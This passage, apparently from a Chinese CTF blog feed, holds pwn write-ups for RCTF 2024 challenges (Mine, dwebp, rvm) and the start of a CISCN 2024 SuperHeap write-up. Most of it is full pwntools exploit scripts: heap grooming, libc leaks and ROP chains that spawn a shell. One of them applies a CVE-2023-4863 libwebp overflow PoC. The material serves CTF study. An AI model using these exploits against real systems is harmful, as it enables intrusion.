class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>backdoor=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(system))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(log))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(backdoor))<br><br>choose(<span class="hljs-number">2</span>)<br>choose(<span class="hljs-number">1337</span>)<br><br>magic_drop()<br><br>rapids(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Hope your next visit.&#x27;</span>)<br>rapids(<span class="hljs-number">1</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Input the Comments: &#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(backdoor))<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="Mine"><a href="#Mine" class="headerlink" title="Mine"></a>Mine</h1><p>又是wasm，qwb经典再现</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>扫雷</p><ul><li>uncover：U扫雷</li><li>mask：M标记</li><li>change：U一次后输入别的字母可以更改整个map的内容</li></ul><p>洞在change里</p><img src="/2024/05/28/2024rctfpwnwp/movsx.png" class title="movsx"><p>r9b为负数的时候movsx会扩展为负数，可以直接改name的指针，指向flag即可</p><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br><br>p=process(<span class="hljs-string">&#x27;./run.sh&#x27;</span>)<br>pause()<br>p.sendlineafter(<span class="hljs-string">b&quot;Your Name:&quot;</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;mark): &quot;</span>,<span class="hljs-string">b&quot;0 0 U&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;mark): &quot;</span>,<span class="hljs-string">b&quot;0 0 A&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        sleep(<span class="hljs-number">0.02</span>)<br>        p.sendlineafter(<span class="hljs-string">b&quot;]:&quot;</span>,<span class="hljs-string">b&quot;n&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;]:&quot;</span>,<span class="hljs-string">b&quot;y &quot;</span>+p8(<span class="hljs-number">0x90</span>))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    sleep(<span class="hljs-number">0.02</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;]:&quot;</span>,<span class="hljs-string">b&quot;n&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="dwebp"><a href="#dwebp" class="headerlink" title="dwebp"></a>dwebp</h1><h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>size过大的话还是会申请feedback结构体，但没有初始化</p><img src="/2024/05/28/2024rctfpwnwp/f000.png" class title="f000"><ul><li>如果是从tcache中申请chunk content指针就是加密过的next指针</li><li>如果是unsorted bin残留的刚好0x20的chunk，会先放进tcache再返回，同上</li><li>如果是切割unsorted bin的话不会出现这种问题↑</li><li>可以用unsorted bin残留的指针改main_arena，造堆块重叠</li></ul><h3 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;How many words do you want to feedback?\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Please input your feedback:\n&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Please input your feedback:\n&#x27;</span>,content)<br><br><br>p=process(<span class="hljs-string">&#x27;./dwebp&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x600</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>show(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Feedback:\n&#x27;</span>)<br>p.recv(<span class="hljs-number">8</span>)<br>libcbase=u64(p.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0x21b110</span><br>heap=u64(p.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0x2b0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x150</span>+p64(<span class="hljs-number">0x140</span>)+p64(<span class="hljs-number">0x3d0</span>))<br><br>delete(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x100</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x141</span>)+p64(libcbase+<span class="hljs-number">0x21ace0</span>)*<span class="hljs-number">2</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;How many words do you want to feedback?\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10000</span>).encode())<br><br>edit(<span class="hljs-number">2</span>,p64(heap+<span class="hljs-number">0x8f0</span>)+p64(heap+<span class="hljs-number">0x3e0</span>)+p64(heap+<span class="hljs-number">0x2d0</span>)*<span class="hljs-number">2</span>)<br><br>delete(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x140</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0xe0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(libcbase+<span class="hljs-number">0x222200</span>)+p64(<span class="hljs-number">0x100</span>))<br><br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Feedback:\n&#x27;</span>)<br>stack=u64(p.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0x1a0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0xe0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(stack)+p64(<span class="hljs-number">0x100</span>))<br><br>ret=libcbase+<span class="hljs-number">0x0000000000029139</span><br>rdi=libcbase+<span class="hljs-number">0x000000000002a3e5</span><br>bin_sh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>system=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload=p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>edit(<span class="hljs-number">2</span>,payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p><em>还是不够深刻，再贴一次~~~&#x2F;&#x2F;&#x2F;(^v^)\\\~~~</em></p><img src="/2024/05/28/2024rctfpwnwp/sendline.jpg" class title="sendline"><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p><a href="https://github.com/mistymntncop/CVE-2023-4863">CVE-2023-4863</a></p><p><em>懒得看原理了</em></p><ul><li>bad.webp可以直接触发报错，检测是否有洞</li><li>nso.webp是可控溢出POC</li></ul><p>bad.webp和nso.webp都会造成越界，但bad.webp的越界是连续的且不可控</p><img src="/2024/05/28/2024rctfpwnwp/bad.png" class title="bad"><p>nso.webp的溢出不连续，可以通过堆风水避免破坏重要数据</p><img src="/2024/05/28/2024rctfpwnwp/overflow.png" class title="overflow"><img src="/2024/05/28/2024rctfpwnwp/nso.png" class title="nso"><p>大概思路就是通过overflow把size改大进行越界读写</p><p><em><strong>一个小（da）插曲</strong></em></p><p><em>有个笨比发base64的时候用的sendline，长度校验没过直接跳过了base64的解码，能触发才怪</em></p><h3 id="Exp-3"><a href="#Exp-3" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;How many words do you want to feedback?\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Please input your feedback:\n&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Please input your feedback:\n&#x27;</span>,content)<br><br><br>p=process(<span class="hljs-string">&#x27;./dwebp&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x100</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x600</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>show(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Feedback:\n&#x27;</span>)<br>p.recv(<span class="hljs-number">8</span>)<br>libcbase=u64(p.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0x21b110</span><br>heap=u64(p.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0x2b0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;nso.webp&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    data=file.read()<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x160</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x1d0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x230</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x3630</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload=base64.b64encode(data)<br><span class="hljs-built_in">print</span>(payload)<br>p.sendafter(<span class="hljs-string">b&#x27;Your webp format image in base64:\n&#x27;</span>,payload)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x34b0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(libcbase+<span class="hljs-number">0x222200</span>)+p64(<span class="hljs-number">8</span>))<br><br>show(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Feedback:\n&#x27;</span>)<br>stack=u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(stack-<span class="hljs-number">0x1a0</span>)+p64(<span class="hljs-number">0x200</span>))<br>ret=<span class="hljs-number">0x0000000000029139</span>+libcbase<br>rdi=<span class="hljs-number">0x000000000002a3e5</span>+libcbase<br>bin_sh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>system=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>payload=p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)<br>edit(<span class="hljs-number">1</span>,payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="rvm"><a href="#rvm" class="headerlink" title="rvm"></a>rvm</h1><p><em><strong>“逆完了没找到洞？”</strong> wjy做vm的经典操作罢了</em></p><p><em>串频了，这是矩阵杯ε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~</em></p><p><em>这题比赛的时候没完全逆完</em></p><p>纯逆向题懒得做了， 详情见<a href="https://mp.weixin.qq.com/s/yD-KaYK9-TjhJVhWuHkU1A">S1uM4i的wp</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 CISCN初赛 pwn wp</title>
    <link href="/2024/05/20/2024%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bpwn-wp/"/>
    <url>/2024/05/20/2024%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bpwn-wp/</url>
    
    <content type="html"><![CDATA[<p>两天极限speed run，惯例反思：这两周颓了，状态不对，速度还是太慢，希望保持这种节奏</p><span id="more"></span><h1 id="SuperHeap"><a href="#SuperHeap" class="headerlink" title="SuperHeap"></a>SuperHeap</h1><p>这段时间最戏剧的事情：比赛结束前5分钟电脑死机了^V^</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><em>为什么国赛这么喜欢go</em></p><ul><li>逆向8.3一把梭</li><li>交互比较麻烦，套了一层base64，一层protobuf，一层base32，真是套套又娃娃，<em>proto用pbtk提取即可食用</em></li><li>经测试edit可溢出，那就简单了，<em>谁还逆向啊，盲猜永远的神</em></li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><ul><li><p>溢出把空字符都盖了即可带出下一个chunk的内容，<em>由于沙箱堆比较乱，真麻烦</em></p></li><li><p>book的管理结构体也是写在堆里的，可以用上一个chunk覆盖管理结构体的指针任意写</p><p><em><strong>比赛的时候就做到这了，然后想写栈结果发现这个go用的不是正常的栈且栈地址无法预测^V^，此时距离比赛结束还有不到十五分钟完全不够我打IO，笑死早知道不看vm看这个说不定就出了</strong></em></p></li><li><p>house of apple打IO，orw</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> bookProto_pb2<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode64</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">return</span> base64.b64encode(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode32</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">return</span> base64.b32encode(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">protoencode</span>(<span class="hljs-params">title,author,isbn,date,price,stock</span>):<br>    book=bookProto_pb2.CTFBook()<br>    book.title=encode64(title)<br>    book.author=encode64(author)<br>    book.isbn=encode64(isbn)<br>    book.publish_date=encode64(date)<br>    book.price=price<br>    book.stock=stock<br>    pack=book.SerializeToString()<br>    <span class="hljs-keyword">return</span> pack<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">idx,title,author,isbn,date,price,stock</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter your choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Special Data: &#x27;</span>,encode32(protoencode(title,author,isbn,date,price,stock)))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">see</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter your choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">returnn</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter your choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span 